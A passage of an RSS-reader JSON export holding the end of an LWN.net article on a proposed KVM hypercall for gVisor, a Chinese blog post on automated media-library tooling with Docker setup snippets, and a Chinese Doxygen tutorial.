executed by gVisor within the\nvirtual machine, but some of them must be handled in the less-constrained\ncontext of the host.\nIt certainly works for gVisor to simply perform a\nvirtual-machine exit to have the controlling process on the host side\nexecute the call, then return the result back into the virtual machine, but\nexits are slow.  Performing a lot of exits can badly hurt the performance\nof the workload overall; since part of the purpose of a system like gVisor\nis to provide better performance than pure virtualization, that is seen as\nundesirable.\n</p><p>\nThe proposed solution is to provide a new hypercall (<tt>KVM_HC_HOST_SYSCALL</tt>)\nthat the guest kernel can use to run a system call directly on the host.\nIt takes two parameters: the system-call number and a <tt>pt_regs</tt>\nstructure containing the parameters for that system call.  After executing\nthe call in the host context (without actually exiting from the\nvirtual machine), this hypercall will return the result back to the caller.\nThis interface only works if the guest knows enough about the host's memory\nlayout to provide sensible system-call parameters; in the gVisor case,\nwhere the memory layout is the same on both sides, no special attention is\nrequired. \n\n</p><p>\n\nInternally, this functionality works by way of a new helper called <a href=\"https://lwn.net/ml/linux-kernel/20220722230241.1944655-2-avagin@google.com/\"><tt>do_ksyscall_64()</tt></a>,\nwhich can invoke any system call from within the kernel.  Given that\ninvoking system calls in this way is generally frowned upon, this\nfunctionality seems sure to be a lightning rod for criticism and, indeed,\nThomas Gleixner duly <a href=\"https://lwn.net/ml/linux-kernel/87a68vtvhf.ffs@tglx/\">complained</a>: \"<q>this\nexposes a magic kernel syscall interface to random driver\nwriters. Seriously no</q>\".  While he acknowledged that the series overall\nis \"<q>a clever idea</q>\", he made it clear that exposing system calls in\nthis way was not going to fly.\n</p><p>\nMeanwhile, the ability to invoke host-side system calls directly from a KVM\nguest pokes a major hole in the isolation between virtual \nmachines and the host.  Indeed, the cover letter describes it as \"<q>a\nbackdoor for regular virtual machines</q>\".  Thus, as one would expect,\nthe direct system-call feature is disabled by default; processes that want\nto use it must enable it explicitly when creating a virtual machine.  Most\nhypervisors, it is to be expected, will not do that.\n</p><p>\nThe kernels running deep within companies like Google often contain\nsignificant changes that are not found in the upstream code; this patch set\ngives a hint of what one of those changes looks like:\n</p><p>\n</p><blockquote>\n\tIn the Google kernel, we have a kvm-like subsystem designed\n\tespecially for gVisor. This change is the first step of integrating\n\tit into the KVM code base and making it available to all Linux\n\tusers.\n</blockquote>\n<p>\nThat led Sean Christopherson to <a href=\"https://lwn.net/ml/linux-kernel/Yts1tUfPxdPH5XGs@google.com/\">ask</a> about what the\nfollowing steps would be.  \"<q>It's practically impossible to review this\nseries without first understanding the bigger picture</q>\".  Merging this\nfirst step could be a mistake if the following steps turn out not to be\nacceptable; at that point, the kernel community could find itself\nsupporting a partial feature that is not actually being used.  As it turns\nout, Vagin <a href=\"https://lwn.net/ml/linux-kernel/CAEWA0a4hrRb5HYLqa1Q47=guY6TLsWSJ_zxNjOXXV2jCjUekUA@mail.gmail.com/\">said</a>,\nthis is the \nonly feature that is needed.  gVisor works on top of KVM now, he said; the\ncurrent patch series just improves its performance.\n</p><p>\nChristopherson also asked about alternatives, noting that \"<q>making\narbitrary syscalls from within KVM is mildly terrifying</q>\".  Vagin\nprovided a few, starting with the current scheme where a virtual-machine\nexit is used to (slowly) handle each system call.\nAnother approach is to run <i>all</i> of gVisor on the host side, exiting from the\nvirtual machine for every system call.  Executing a system call in this\nmode takes about 2.1µs; the direct system-call mechanism reduces that to\nabout 1.0µs.  Or gVisor could use BPF to handle the system calls; that\nprovides similar performance, Vagin said, but would require some\nquestionable changes, like providing BPF programs with the ability to\ninvoke arbitrary system calls.  Yet another possibility is to use the\nonce-proposed <a href=\"https://lwn.net/Articles/852662/\"><tt>process_vm_exec()</tt> system\ncall</a>, but that can perform poorly in some situations.\n</p><p>\nKVM maintainer Paolo Bonzini <a href=\"https://lwn.net/ml/linux-kernel/69b45487-ce0e-d643-6c48-03c5943ce2e6@redhat.com/\">said</a>\nthat his largest objection is the lack of address translation between the\nguest and the host.  In its current form, this mechanism depends on the\nmemory layout being the same on both sides; otherwise any addresses in an\nargument to a system call would not make sense on the host side.  As a\nresult, the new mechanism is highly specialized for gVisor and seems\nunlikely to be more widely useful.  It is not clear that everybody sees\nthat specialization as a disadvantage, though.\n</p><p>\nAll told, gVisor in this mode represents an interesting shift in the\nsecurity boundary between a host and the containers it runs.  Much of the\nsecurity depends on code that is within the virtual machine, with the host\nside trusting that code at a fairly deep level.  It is a different view of\nhow virtualization with KVM is meant to work, but it seems that the result\nworks well — within Google at least.  Whether this mechanism will make it\ninto the mainline remains an open question, though.  Making holes in the\nwall between host and guest is not something to be done lightly, so the\ndevelopers involved are likely to want to be sure that no better\nalternatives exist.<br clear=\"all\"></p><table>\n           <tbody><tr><th colspan=\"2\">Index entries for this article</th></tr>\n           <tr><td><a href=\"https://lwn.net/Kernel/Index\">Kernel</a></td><td><a href=\"https://lwn.net/Kernel/Index#Virtualization-KVM\">Virtualization/KVM</a></td></tr>\n            </tbody></table><br clear=\"all\">\n<div>\n               <table align=\"right\"><tbody><tr><td>\n               \n               \n               \n               </td></tr></tbody></table>\n               </div>\n               <br clear=\"all\">\n               <table align=\"right\"><tbody><tr><td>\n           \n           \n           </td></tr></tbody></table>\n           <br clear=\"all\">\n           <p>\n           \n</p>"
    },
    "origin": {
        "streamId": 22,
        "title": "LWN.net",
        "htmlUrl": "https://lwn.net/",
        "feedUrl": "http://lwnfeed:8080/feed.rss"
    }
},
{
    "id": "https://blog.17lai.site/posts/db7bf49b/",
    "timestampUsec": "1659194916282524",
    "categories": [
        "pt",
        "nas",
        "docker",
        "emby",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "视频图书和音乐完全自动化管理框架图解",
    "author": "",
    "published": 1652067420,
    "updated": 1652067420,
    "alternate": [
        {
            "href": "https://blog.17lai.site/posts/db7bf49b/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<blockquote>\n<p>音视频，音乐和图书管理全过程自动化解决方案框架图解！结构化你的音视频、音乐和图书资源。所有过程一张图搞定！</p>\n</blockquote>\n<span></span>\n<h2>框架自动化构架图解</h2>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/09/20220509113832.webp\" alt=\"自动化框架构架\"></p>\n<h2>相关文章</h2>\n<div>\n    \n        <a href=\"https://blog.17lai.site/posts/2b9325d0/\"><img src=\"https://blog.17lai.site/medias_webp/cover/music.webp\"></a>\n    \n    <div>\n        <a href=\"https://blog.17lai.site/posts/2b9325d0/\">私人在线音乐服务器搭建与使用介绍</a>\n        <hr>\n        <div>私人在线音乐服务器搭建与使用介绍！Mstream Docker 部署， rclone 挂载 webdav 网盘。 cloudflare parterner加速。</div>\n    </div>\n</div>\n<div>\n    \n        <a href=\"https://blog.17lai.site/posts/9912bd5d/\"><img src=\"https://blog.17lai.site/medias_webp/cover/emby.webp\"></a>\n    \n    <div>\n        <a href=\"https://blog.17lai.site/posts/9912bd5d/\">使用jeckett,sonarr,iyuu,qt,emby打造全自动追剧流程</a>\n        <hr>\n        <div>jackett 作为种子源，sonarr剧集管理，bt下载，qbittorrent主力下载，使用iyuu转移辅种，emby，jellyfin做海报墙，sunfinder自动下载字幕。基本算是完美打通全流程自动追剧。bt种子文件命名规则SxxExx的自动识别下载，国内的资源手动查找下载，自动推送到emby刮削好。结合本地DNS管理，DNS去广告，Nginx 反向代理去端口访问，形成一个完整解决方案。</div>\n    </div>\n</div>\n<h2>图书、音乐、视频三剑客！</h2>\n<blockquote>\n<p>结构化自己的图书，音乐，和视频！</p>\n</blockquote>\n<div>\n    \n        <a href=\"https://blog.17lai.site/posts/dc1c8194/\"><img src=\"https://blog.17lai.site/medias_webp/cover/book.webp\"></a>\n    \n    <div>\n        <a href=\"https://blog.17lai.site/posts/dc1c8194/\">如何建立自己的私人图书馆</a>\n        <hr>\n        <div>图书管理员似乎是个非常有前途的职业，远的有孔子，游学之前当图书管理员，近的有本朝开国毛教员，也当了很长时间图书管理员。我们也可以自己做个私人电子图书馆，单个管理员，说不定很有前途？</div>\n    </div>\n</div>\n<div>\n    \n        <a href=\"https://blog.17lai.site/posts/3847ad58/\"><img src=\"https://blog.17lai.site/medias_webp/cover/music.webp\"></a>\n    \n    <div>\n        <a href=\"https://blog.17lai.site/posts/3847ad58/\">如何使用media Go,MusicBrainz,Mp3tag工具刮削音乐 整理音乐资料库</a>\n        <hr>\n        <div>音乐文件则是将歌名、歌手、专辑、发行时间、歌词、封面图等信息写入文件标签，称为ID3 Tag 。它能够在MP3中附加曲子的演出者、作者以及其它类别资讯，方便众多乐曲的管理。</div>\n    </div>\n</div>\n<div>\n    \n        <a href=\"https://blog.17lai.site/posts/e6d40157/\"><img src=\"https://blog.17lai.site/medias_webp/cover/emby.webp\"></a>\n    \n    <div>\n        <a href=\"https://blog.17lai.site/posts/e6d40157/\">如何使用tinyMediaManager刮削电影和电视剧，动画，并自动下载字幕</a>\n        <hr>\n        <div>tinyMediaManager是最好用的视频刮削工具，可以刮削电影，动画，电视剧。使用TinyMediaManager生成nfo元数据文件，多媒体软件解析生成海报墙展示丰富的影片信息，配合Emby，Plex使用体验绝佳</div>\n    </div>\n</div>\n<h2>相关资源</h2>\n<blockquote>\n<p>更多相关资源可以到下面网址查看</p>\n<ul>\n<li><a href=\"https://hub.docker.com/repositories\">DockerHub</a></li>\n<li><a href=\"https://github.com/appotry\">Github</a></li>\n</ul>\n</blockquote>\n<h3>nas-tools</h3>\n<blockquote>\n<ul>\n<li><a href=\"https://github.com/jxxghp/nas-tools\">nas-tools Github</a></li>\n<li><a href=\"https://hub.docker.com/repository/docker/jxxghp/nas-tools\">nas-tools DockerHub</a></li>\n</ul>\n</blockquote>\n<p>推荐一下这个，作者相当勤奋，更新速度非常快！最重要的是它是国人开发，对中文支持很好！有问题提Issue，作者回复也很快！</p>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/09/20220509115933.webp\" alt=\"nas-tools\"></p>\n<h4>功能：</h4>\n<h5>1、资源检索</h5>\n<ul>\n<li>PT站聚合<code>RSS</code>订阅，实现资源自动追新。</li>\n<li>通过微信、Telegram或者WEB界面聚合检索资源并择优，最新热门一键搜索或者订阅。</li>\n<li>在豆瓣中标记，后台自动检索，未出全的自动加入<code>RSS</code>追更。</li>\n</ul>\n<h5>2、媒体识别和重命名</h5>\n<ul>\n<li>监控下载软件，下载完成后自动识别真实名称，硬链接到媒体库并重命名。</li>\n<li>对目录进行监控，文件变化时自动识别媒体信息硬链接到媒体库并重命名。</li>\n<li>支持国产剧集，支持动漫，改名后<code>Emby/Jellyfin/Plex</code> 100%搜刮。</li>\n</ul>\n<h5>3、消息服务</h5>\n<ul>\n<li>支持<code>ServerChan</code>、微信、<code>Telegram</code>、<code>Bark</code>等图文消息通知，直接在手机上控制。</li>\n</ul>\n<h5>4、其它</h5>\n<ul>\n<li>自动签到、<code>Emby/Jellyfin/Plex</code>播放状态通知等等。</li>\n</ul>\n<h4>安装</h4>\n<figure><div><pre data-language=\"yaml\"><code>version: \"3.4\"\nservices:\n  nastools:\n    image: jxxghp/nas-tools:latest\n    container_name: nastools\n    hostname: nastools\n    # ports:\n      # - 3000:3000        # 默认的webui控制端口\n    volumes:\n      - ${USERDIR}/nastools/config:/config   # 冒号左边请修改为你想保存配置的路径\n      - ${USERDIR}/[path]/Download:/share/Download\n      #- /你的媒体目录:/你想设置的容器内能见到的目录   # 媒体目录，多个目录需要分别映射进来\n    environment:\n      - PUID=${PUID}\n      - PGID=${PGID}\n      - TZ=${TZ}\n      - UMASK=022 # 掩码权限，默认000，可以考虑设置为022\n     #- REPO_URL=https://ghproxy.com/https://github.com/jxxghp/nas-tools.git  \n    restart: always </code></pre></div></figure>\n<h4>参数配置</h4>\n<p>新版参数基本都可以在web界面配置。</p>\n<p>也可以直接修改配置文件，配置文件中有非常详细的注释！请认真查看配置文件中的文本注释！</p>\n<p>配置文件位置，基于docker路径<code>/config/config.yaml</code></p>\n<p>配置文件模板，可以仓库下面链接文件</p>\n<p><code>https://github.com/jxxghp/nas-tools/blob/master/config/config.yaml</code></p>\n<h3>硬链接工具</h3>\n<blockquote>\n<ul>\n<li><strong><a href=\"https://github.com/appotry/PTtool\">Github appotry/PTtool</a></strong></li>\n</ul>\n</blockquote>\n<h3>nginx docker</h3>\n<blockquote>\n<ul>\n<li><strong><a href=\"https://github.com/appotry\">Github appotry</a>/<a href=\"https://github.com/appotry/nginx-purge-docker\">nginx-purge-docker</a></strong></li>\n<li><a href=\"https://hub.docker.com/repository/docker/bloodstar/nginx-purge\">nginx DockerHub</a></li>\n</ul>\n</blockquote>\n<h3>prowlarr</h3>\n<blockquote>\n<p>最早是玩<code>sonarr</code>、<code>radarr</code>，然后找到i相关的全家桶，见下图</p>\n</blockquote>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/09/20220509122743.webp\" alt=\"prowlarr\"></p>\n<blockquote>\n<p>发现各种资源，结构化，<code>Github</code>上面都有很完善的解决方案，但大都对中文支持不好。而且各种上下游资源也是越来越丰富，看看<code>prowlarr</code>支持的<code>app</code>，基本覆盖你的所有所需！<code>Whisparr</code>项目的介绍惊呆了我😄</p>\n<p>国人也有一些好项目，<code> IYUU</code>，<code>nas-tools</code>等。</p>\n</blockquote>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/09/20220509122740.webp\" alt=\"prowlarr\"></p>\n<h3><a href=\"https://github.com/FlareSolverr/FlareSolverr\">FlareSolverr</a></h3>\n<figure><div><pre data-language=\"bash\"><code>docker run -d \\\n  --name=flaresolverr \\\n  -p 8191:8191 \\\n  -e LOG_LEVEL=info \\\n  --restart unless-stopped \\\n  ghcr.io/flaresolverr/flaresolverr:latest</code></pre></div></figure>\n<p>如果成功启动，访问<code>ip:8191</code>将看到如下信息</p>\n<figure><div><pre data-language=\"json\"><code>{\n\"msg\": \"FlareSolverr is ready!\",\n\"version\": \"v2.2.4\",\n\"userAgent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0\"\n}</code></pre></div></figure>"
    },
    "origin": {
        "streamId": 34,
        "title": "夜法之书",
        "htmlUrl": "https://blog.17lai.site/",
        "feedUrl": "https://blog.17lai.site/atom.xml"
    }
},
{
    "id": "https://blog.17lai.site/posts/1acb0edb/",
    "timestampUsec": "1659194916282526",
    "categories": [
        "tools",
        "doxygen",
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Doxygen入门教程",
    "author": "",
    "published": 1653741000,
    "updated": 1653741000,
    "alternate": [
        {
            "href": "https://blog.17lai.site/posts/1acb0edb/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<blockquote>\n<p>Doxygen是API文档生成工具，可以根据代码注释生成文档的工具。支持HTML、CHM、PDF等格式。主要支持C语言、Python语言，其它C语系语言也支持（如C++、Java、C#等）。</p>\n</blockquote>\n<span></span>\n<p><img src=\"https://cimg1.17lai.site/data/2022/05/28/20220528211032.webp\" alt=\"Doxygen效果演示\"></p>\n<p>本教程的测试环境</p>\n<ul>\n<li>Ubuntu 18.04 LTS</li>\n<li>Doxygen 1.8.13</li>\n<li>C++</li>\n<li>Gitlab CI/CD</li>\n<li>windows</li>\n</ul>\n<h2>什么是 Doxygen？</h2>\n<p>Doxygen 是一个将文件的特定注释转化为文档的工具</p>\n<h2>如何安装 Doxygen？</h2>\n<figure><div><pre data-language=\"bash\"><code>$ sudo apt install graphviz\n$ sudo apt install doxygen</code></pre></div></figure>\n<h2>如何使用 Doxygen？</h2>\n<p><strong>1. 查看你使用的语言 Doxygen 是否默认支持？</strong></p>\n<p>Doxygen 默认支持的语言有：C，C++，C#，Objective-C，IDL，Java，VHDL，PHP，Python，Tcl，Fortran 和 D</p>\n<p><strong>2. 生成配置文件</strong></p>\n<figure><div><pre data-language=\"bash\"><code>$ ## 生成配置文件，默认配置文件名为：Doxyfile\n$ doxygen -g   &lt;config-file&gt;\n$\n$ ## 生成配置文件（不含注释）\n$ doxygen -s -g &lt;config-file&gt;\n$</code></pre></div></figure>\n<p><strong>3. 修改配置文件</strong></p>\n<figure><div><pre data-language=\"makefile\"><code>## 常见配置选项\n\n## 设置项目编码，默认为 UTF-8\nDOXYFILE_ENCODING = UTF-8\n\n## 设置项目名称\nPROJECT_NAME = \"project-name\"\n\n## 设置项目版本号\nPROJECT_NUMBER = \"1.0.0\"\n\n## 设置项目的描述\nPROJECT_BRIEF = \"这是项目描述\"\n\n## 设置项目的 logo \nPROJECT_LOGO = \"\"\n\n## 设置输入目录，如果未设置，则在当前目录查找\nINPUT = src\n\n## 设置要匹配的输入文件\nFILE_PATTERNS = *.cc *.h\n\n## 设置不需要处理的输入目录\nEXCLUDE =\n\n## 设置不需要匹配的输入文件\nEXCLUDE_PATTERNS =\n\n## 设置输入编码，默认为 UTF-8\nINPUT_ENCODING = UTF-8\n\n## 设置是否递归搜索输入目录，默认为 NO\nRECURSIVE = NO\n\n## 设置是否提取所有类，函数等（不包括类的私有成员和静态成员），默认为 NO\nEXTRACT_ALL = NO\n\n## 设置是否提取类的私有成员，默认为 NO\nEXTRACT_PRIVATE = NO\n\n## 设置是否提取类的静态成员，默认为 NO\nEXTRACT_STATIC = NO\n\n## 设置文档是否包含源文件，默认为 NO\nSOURCE_BROWSER = NO\n\n## 设置是否对每个类都链接到其所在的头文件中，默认值为 YES\nVERBATIM_HEADERS = YES\n\n## 设置文档的输出目录\nOUTPUT_DIRECTORY = doc\n\n## 设置是否支持 Markdown，默认值为 YES\nMARKDOWN_SUPPORT = YES\n\n## 设置文档的主界面\nUSE_MDFILE_AS_MAINPAGE =\n\n## 设置文档的语言，默认为 English\nOUTPUT_LANGUAGE = Chinese         </code></pre></div></figure>\n<p><strong>4. 给代码添加注释</strong><br>\n并不是所有的注释都会被收入文档，Doxygen 支持的常用的注释风格有：</p>\n<figure><div><pre data-language=\"c\"><code>/**     注释的内容       */\n/*!     注释的内容       */\n\n## 在变量后 注释文件，类，结构体，共同体，枚举成员 或 函数参数\nint a; /**&lt;      注释的内容        */\nint a; /*!&lt;      注释的内容        */</code></pre></div></figure>\n<p><strong>注意：</strong> 这里并不是所有的注释风格，更多注释风格见 <a href=\"http://doxygen.nl/manual/docblocks.html\">官网</a></p>\n<p>Doxygen 常用的注释标记（标记以 / 或 @ 开头表示）：</p>\n<figure><div><pre data-language=\"makefile\"><code>## 添加作者\n@author 作者1 作者2\n\n## 添加日期\n@date 日期\n\n## 添加文件名\n@file 文件名\n\n## 添加简单描述\n@brief 简要描述\n\n## 添加详细描述\n@details 详细描述\n\n## 添加类信息\n@class 类名 类所在的文件 类所在的文件（可包括路径） \n\n## 添加结构体信息\n@class 结构体名 结构体所在的文件 结构体所在的文件（可包括路径）\n\n## 添加宏信息\n@enum 宏名\n\n## 添加函数信息\n@fn 函数信息\n\n## 添加参数说明\n@param [in]   输入参数名 说明\n@param [out] 输出参数名 说明\n\n## 添加返回说明\n@return 返回说明\n\n## 添加返回特定值说明\n@retval 特定值 特定返回值说明\n\n## 添加异常说明\n@exception 异常类型 异常说明\n\n## 添加代码\n@code\n...代码...\n@encode\n\n## 添加文件名说明\n@headfile 文件名 文件名（可包括路径） \n\n## 添加版本号\n@version 版本号\n\n## 添加计划做的事儿\n@todo 计划做的事\n\n## 添加参考 \n@see 参加其它\n\n## 添加过时说明\n@deprecated 过时说明\n\n## 添加 bug 说明\n@bug \"bug 说明\"\n\n## 添加例子\n@example 例子文件名\n\n## 添加警告信息\n@warning 警告信息\n\n## 添加开始使用的版本\n@since 版本\n\n## 添加测试信息\n@test 测试\n\n## 添加主界面信息\n@mainpage 标题\n\n## 添加注意事项 \n@note 注意事项\n\n## 添加协议信息\n@copyright 协议信息</code></pre></div></figure>\n<h3>为C/C++添加注释</h3>\n<p>首先为函数添加注释信息，这是必须要做的。这里有个选择性问题，添加到哪里呢？.c文件？.h文件？</p>\n<p>一般来说：</p>\n<ul>\n<li>.h文件代表模块对外的接口最小信息，面向模块使用者</li>\n<li>.c文件代表模块的实现代码，面向的是开发者</li>\n</ul>\n<p>在实际编程中，事先约定各个模块间的接口，然后将不同的模块分配给不同的开发者，与此同时，测试人员根据接口要求，编写测试代码，这就完全保证了并发编程和白盒测试要求。</p>\n<p>这里我们可以看到，文档主要是用来描述接口信息的，所以，我对代码的注释规定如下：</p>\n<ul>\n<li>模块对外接口，仅在.h中提供注释信息</li>\n<li>模块内部辅助函数，全部用static设为私有函数，同时仅在.c中保留注释信息</li>\n</ul>\n<p>当然，您也可以同时为.c .h的接口函数编写两份完全一样的注释信息，但这么做，您会同时维护两份信息，出错的概率会更大些。</p>\n<p>确定了注释位置，下一步考虑一个函数需要哪些信息</p>\n<p>一般来说，需要函数功能，入口参数，返回值，注意事项，某些时候还需要说明上下文环境，从而保证函数能正确执行</p>\n<p>比如这个函数</p>\n<figure><div><pre data-language=\"c\"><code>extern int Dev_PrintInt(int number); </code></pre></div></figure>\n<p>它的功能就是打印一个整形数据，传入参数为整数，返回的是成功打印的数据长度（字节为单位），同时呢，我们在调用这个函数之前，必须要先初始化Dev设备</p>\n<p>ok，这就是所有接口信息，稍微规范一下，就变成了下面的样子</p>\n<figure><div><pre data-language=\"c\"><code>// 函数功能：打印整数\n// 入口参数：number为一个整数类型\n// 返回结构：返回的是成功打印的数据长度（字节为单位）\n// 注意事项：\n//          1：在调用本函数前，请确保已经调用Dev_Init初始化设备\n//          2：请注意函数返回值，如果该值为0，则说明函数执行失败\n\nextern int Dev_PrintInt(int number); </code></pre></div></figure>\n<p>用英文来书写呢，则变成下面的样子</p>\n<figure><div><pre data-language=\"c\"><code>//***************************************************************************************\n//\n// brief  : Print Int number to terimal device.\n//\n// param  : number is the data you want to print.\n// retval : the number of print information, in bytes. return zero indicate print error !\n//\n// Note:\n//      * Be sure you have called \\ref Dev_Init function before call this fuction.\n//      * Remember to check return value.\n//\n//***************************************************************************************\nextern int Dev_PrintInt(int number);</code></pre></div></figure>\n<p>注释信息写完了，一般来说，函数能达到这种信息程度就ok了，但既然要生成文档，就不得不考虑一个问题</p>\n<p>如果你是Doxygen作者，怎么从上面的注释里面提取信息呢，信息那么多，有<code>*</code>号，有各种文字信息。</p>\n<p>你可以将所有的注释信息都输出出来，但这么做，等于没有分类整理，同时也包含了杂乱信息，比如一排<code>*</code></p>\n<p>另外一个解决方法是：设置某些特殊字符，比如<code>function</code>表示，一旦检测到这个特殊标记，则认为是接下来<br>\n的一行是函数功能描述。但这么做，万一用户的注释里面出现很多个function，你怎么识别哪个是普通文本，<br>\n哪个是特殊标记？</p>\n<p>也许你会说了，可以采用<mjx-container jax=\"SVG\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D439\" d=\"M48 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H742Q749 676 749 669Q749 664 736 557T722 447Q720 440 702 440H690Q683 445 683 453Q683 454 686 477T689 530Q689 560 682 579T663 610T626 626T575 633T503 634H480Q398 633 393 631Q388 629 386 623Q385 622 352 492L320 363H375Q378 363 398 363T426 364T448 367T472 374T489 386Q502 398 511 419T524 457T529 475Q532 480 548 480H560Q567 475 567 470Q567 467 536 339T502 207Q500 200 482 200H470Q463 206 463 212Q463 215 468 234T473 274Q473 303 453 310T364 317H309L277 190Q245 66 245 60Q245 46 334 46H359Q365 40 365 39T363 19Q359 6 353 0H336Q295 2 185 2Q120 2 86 2T48 1Z\"></path></g><g data-mml-node=\"mi\" transform=\"translate(749,0)\"><path data-c=\"1D448\" d=\"M107 637Q73 637 71 641Q70 643 70 649Q70 673 81 682Q83 683 98 683Q139 681 234 681Q268 681 297 681T342 682T362 682Q378 682 378 672Q378 670 376 658Q371 641 366 638H364Q362 638 359 638T352 638T343 637T334 637Q295 636 284 634T266 623Q265 621 238 518T184 302T154 169Q152 155 152 140Q152 86 183 55T269 24Q336 24 403 69T501 205L552 406Q599 598 599 606Q599 633 535 637Q511 637 511 648Q511 650 513 660Q517 676 519 679T529 683Q532 683 561 682T645 680Q696 680 723 681T752 682Q767 682 767 672Q767 650 759 642Q756 637 737 637Q666 633 648 597Q646 592 598 404Q557 235 548 205Q515 105 433 42T263 -22Q171 -22 116 34T60 167V183Q60 201 115 421Q164 622 164 628Q164 635 107 637Z\"></path></g><g data-mml-node=\"mi\" transform=\"translate(1516,0)\"><path data-c=\"1D441\" d=\"M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z\"></path></g><g data-mml-node=\"mi\" transform=\"translate(2404,0)\"><path data-c=\"1D436\" d=\"M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z\"></path></g><g data-mml-node=\"mi\" transform=\"translate(3164,0)\"><path data-c=\"1D447\" d=\"M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z\"></path></g><g data-mml-node=\"mi\" transform=\"translate(3868,0)\"><path data-c=\"1D43C\" d=\"M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z\"></path></g><g data-mml-node=\"mi\" transform=\"translate(4372,0)\"><path data-c=\"1D442\" d=\"M740 435Q740 320 676 213T511 42T304 -22Q207 -22 138 35T51 201Q50 209 50 244Q50 346 98 438T227 601Q351 704 476 704Q514 704 524 703Q621 689 680 617T740 435ZM637 476Q637 565 591 615T476 665Q396 665 322 605Q242 542 200 428T157 216Q157 126 200 73T314 19Q404 19 485 98T608 313Q637 408 637 476Z\"></path></g><g data-mml-node=\"mi\" transform=\"translate(5135,0)\"><path data-c=\"1D441\" d=\"M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z\"></path></g></g></g></mjx-container>这种形式啊，恩，这么做是可行的，可以确保识别出来特殊标记</p>\n<p>接下来，还有一个问题，我们上面的注释中，有很多<code>*</code>号，仅仅起到美观和格式化的作用，当然不希望在<br>\n输出文档中显示这些东西，问题是你怎么识别这些符号，并不显示呢？也许你会说，可以强制规定注释的<br>\n格式，不让用户在代码中写很多<code>*</code>，ok，假设用户同意这么做。那接下来呢，如果我希望在代码中写某些话<br>\n，但是不希望输出到文档中，比如“XX是2B”等等，你又该怎么做呢？</p>\n<p>正向思考遇到问题时，不妨反向考虑，这是谁的问题：是我设计思路的问题还是用户用法的问题？</p>\n<p>困难重重，肯定是设计思路的问题</p>\n<p>如果设计一个标记符，将普通注释和要生成的文档注释区分开来，就能解决问题了。</p>\n<p>Doxygen的用法，说白了，就是为了解决上面提到的两个问题：</p>\n<figure><div><pre><code>怎么区分普通注释和输出注释  \n怎么在输出注释里面，识别特殊标记和普通文本  